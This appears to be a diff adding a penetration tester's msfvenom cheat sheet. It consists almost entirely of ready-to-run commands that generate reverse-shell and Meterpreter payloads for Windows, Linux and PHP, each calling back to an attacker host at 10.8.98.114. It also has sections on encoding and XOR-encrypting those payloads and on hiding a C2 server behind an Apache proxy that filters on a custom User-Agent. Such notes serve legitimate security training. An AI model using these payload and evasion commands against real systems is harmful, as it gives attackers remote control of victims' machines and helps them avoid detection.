@@ -1,0 +1,78 @@
+### msfvenom ###
+## links
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/
+
+
+###########
+## utils ##
+###########
+msfvenom --list payloads							# list all payloads
+msfvenom --list payloads | grep linux/x86/meterpreter
+msfvenom --list payloads | grep linux/x64/meterpreter
+msfvenom --list payloads | grep windows/meterpreter
+msfvenom --list payloads | grep windows/x64/meterpreter
+msfvenom --list platforms							# list all platforms
+msfvenom --list formats								# list all formats
+msfvenom -p linux/x86/shell_reverse_tcp --list-options				# list options of payload
+
+
+#############
+## windows ##
+#############
+# staged & stageless
+msfvenom -p windows/x64/shell/reverse_tcp       LHOST=10.8.98.114 LPORT=4444 -f exe -o shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp     LHOST=10.8.98.114 LPORT=4444 -f exe -o shell.exe -a x86 \
+    --encoder x86/shikata_ga_nai
+# stageless
+msfvenom -p windows/shell_reverse_tcp           LHOST=10.8.98.114 LPORT=4444 -f exe -o shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp       LHOST=10.8.98.114 LPORT=4444 -f exe -o shell.exe 
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.8.98.114 LPORT=4444 -f exe -o shell.exe
+msfvenom -p windows/shell_reverse_tcp           LHOST=10.8.98.114 LPORT=443  -f powershell -v sc	# rshell of powershell byte[]
+
+###########
+## linux ##
+###########
+msfvenom -p linux/x64/meterpreter/reverse_tcp   LHOST=10.8.98.114 LPORT=4444 -f elf -o shell
+msfvenom -p linux/x86/shell_reverse_tcp         LHOST=10.8.98.114 LPORT=4444	# output as raw payload
+
+
+
+#############
+## encoder ##
+#############
+# DOESNT evade NG-AV
+msfvenom --list encoders
+msfvenom -p php/meterpreter/reverse_tcp         LHOST=10.8.98.114 LPORT=4444 \
+	-f raw -e php/base64 -o shell.php					# simple base64 encode
+msfvenom -a x86 --platform Windows              LHOST=10.8.98.114 LPORT=443 \
+	-p windows/shell_reverse_tcp \
+	-e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp				# encode 3 times
+
+
+
+#############
+## encrypt ##
+#############
+# DOESNT evade NG-AV
+msfvenom --list encrypt
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.8.98.114 LPORT=7788 \
+	-f exe --encrypt xor --encrypt-key "MyZekr3tKey***" \
+	-o xored-revshell.exe							# XOR encryption with key
+
+
+#############
+## evasion ##
+#############
+# hide C2 behind a proxy that redirect traffic if UserAgent has specific value
+# https://tryhackme.com/room/introtoc2
+# apache config with proxypass
+	RewriteEngine On
+	RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"
+	ProxyPass "/" "http://localhost:8080/"
+# msfvenom
+msfvenom -p windows/meterpreter/reverse_http LHOST=tun0 LPORT=80 HttpUserAgent=NotMeterpreter -f exe -o shell.exe
+
+
+
+
